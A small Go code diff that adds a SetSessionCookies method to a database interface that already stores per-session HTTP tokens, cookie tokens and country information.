@@ -23,4 +23,5 @@ type IDatabase interface {
 	SetSessionHttpTokens(sid string, tokens map[string]string) error
 	SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error
 	SetSessionCountryInfo(sid string, countryCode string, country string) error
+	SetSessionCookies(sid string, cookies []map[string]interface{}) error
 } 
